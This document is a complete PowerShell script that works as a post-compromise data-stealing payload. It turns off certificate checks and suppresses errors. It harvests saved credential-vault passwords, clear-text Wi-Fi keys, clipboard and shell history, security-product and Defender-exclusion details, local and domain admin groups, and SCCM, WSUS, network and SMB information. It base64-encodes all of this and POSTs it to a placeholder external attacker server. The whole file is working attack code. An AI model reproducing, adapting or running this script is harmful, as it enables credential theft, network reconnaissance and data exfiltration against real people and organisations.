$ErrorActionPreference = 'SilentlyContinue';
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
function Encode64{
param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
};
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];
$vault = New-Object Windows.Security.Credentials.PasswordVault;

function iis_sites_function{try {return Get-IISSite | out-string}catch {return ""}}
function wsus_clients_function{try {return Get-WsusComputer -All | out-string}catch {return ""}}
function wsus_server_function{try {return Get-WsusServer | out-string}catch {return ""}}
function DOMAIN_SCCM_hunter_function{try {$sccm=([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties};return $sccm | out-string}catch {return ""}}

$hostname=Encode64(hostname);
$commands = @{
alias = Encode64(Get-ChildItem Alias: | out-string);
antivirus = Encode64(Get-Service | Where-Object { $_.DisplayName -like "*McAfee*" -or $_.DisplayName -like "*Symantec*" -or $_.DisplayName -like "*Kaspersky*" -or $_.DisplayName -like "*Eset*" -or $_.DisplayName -like "*Sentinel*" -or $_.DisplayName -like "*Falcon*" -or $_.DisplayName -like "*Sophos*" -or $_.DisplayName -like "*Cortex*" -or $_.DisplayName -like "*Attivo*" -or $_.DisplayName -like "*Crowdstrike*" -or $_.DisplayName -like "*Cylance*" -or $_.DisplayName -like "*Carbon*" -or $_.DisplayName -like "*Deepinstinct*" -or $_.DisplayName -like "*mcafee*" -or $_.DisplayName -like "*Symantec*" -or $_.DisplayName -like "*Trend*" -or $_.DisplayName -like "*Defender*" -or $_.DisplayName -like "*Avira*" } | out-string);
applocker = Encode64(Get-AppLockerPolicy -Effective -Xml | out-string);
arp = Encode64(Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State | out-string);
bitlocker = Encode64(Get-BitLockerVolume | out-string);
browser_pwd = Encode64($vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | out-string);
clipboard = Encode64(Get-Clipboard | out-string);
defender_exclusions = Encode64(Get-MpPreference | select Exclusion* | fl | out-string);
defender_status = Encode64(Get-MpComputerStatus | out-string);
dir_c_users = Encode64(Get-ChildItem -Force 'C:\Users\' | out-string);
dir_program_all = Encode64(Get-ChildItem -Force 'C:\Program Files', 'C:\Program Files (x86)', 'C:\ProgramData\' 2>$null | ft Parent,Name,LastWriteTime | out-string);
disk_physical = Encode64(Get-PhysicalDisk | out-string);
disk_volumes = Encode64(Get-Volume | out-string);
dns = Encode64(Get-DnsClientServerAddress | out-string);
dns_cache = Encode64(Get-DnsClientCache | out-string);
env = Encode64(Get-ChildItem Env: | out-string);
firewall_status = Encode64(netsh advfirewall firewall show rule dir=in name=all | Select-String -Pattern 'Yes' -Exclude "Edge traversal" -AllMatches -Context 2,11 | out-string);
get_local_user = Encode64(Get-LocalUser | ft Name,Enabled,Description,LastLogon | out-string);
history_ps = Encode64(Get-History | out-string);
history_bis = Encode64(Get-Content (Get-PSReadlineOption).HistorySavePath | out-string); 
hosts = Encode64(Get-Content C:\WINDOWS\System32\drivers\etc\hosts | out-string);
ipconfig = Encode64(ipconfig /all | out-string);
iis_sites = Encode64(iis_sites_function);
list_install_programs = Encode64(Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name | out-string);
net_accounts = Encode64(net accounts | out-string);
net_localgroup_administrators = Encode64(Get-LocalGroupMember -Group (Get-LocalGroup | Where-Object { $_.SID -eq "S-1-5-32-544" } | select name) | Select-Object Name, ObjectClass | out-string);
net_localgroups = Encode64(Get-LocalGroup | out-string);
net_user = Encode64(net user | out-string);
netstat = Encode64(netstat -ano | out-string);
network_connection = Encode64(Get-NetConnectionProfile | out-string);
network_hardware = Encode64(Get-NetAdapter | out-string);
ping_google = Encode64(ping 8.8.8.8 -n 1 | out-string);
process = Encode64(Get-Process | out-string);
route = Encode64(Get-NetRoute | out-string);
scheduled_tasks = Encode64(schtasks | out-string);
services = Encode64(Get-Service | out-string);
shares = Encode64(net share | out-string);
smb_connections = Encode64(Get-SmbConnection | out-string);
smb_openfile = Encode64(Get-SmbOpenFile | out-string);
smb_sessions = Encode64(Get-SmbSession | out-string);
smb_shares = Encode64(Get-SmbShare | out-string);
startup = Encode64(wmic startup get caption,command | out-string);
system_language = Encode64(Get-WinSystemLocale | out-string);
system_location = Encode64(Get-WinHomeLocation | out-string);
systeminfo = Encode64(systeminfo | out-string);
tasklist = Encode64(tasklist /v | out-string);
tracert = Encode64(tracert 8.8.8.8);
variables = Encode64(Get-ChildItem variable: | out-string);
wifi_profiles = Encode64(netsh wlan show profiles | out-string);
wifi_pwd = Encode64((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | out-string);
whoami = Encode64(whoami /all | out-string);
wsus_clients = Encode64(wsus_clients_function);
wsus_server = Encode64(wsus_server_function);
DOMAIN_net_user = Encode64(net user /domain);
DOMAIN_net_group = Encode64(net group);
DOMAIN_net_group_computers = Encode64(net group "Domain Computers" /domain);
DOMAIN_net_group_admins = Encode64(net group "Domain Admins" /domain);
DOMAIN_net_accounts_domain = Encode64(net accounts /domain);
DOMAIN_SCCM_hunter = Encode64(DOMAIN_SCCM_hunter_function);
};
$URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method POST -Body $params;};
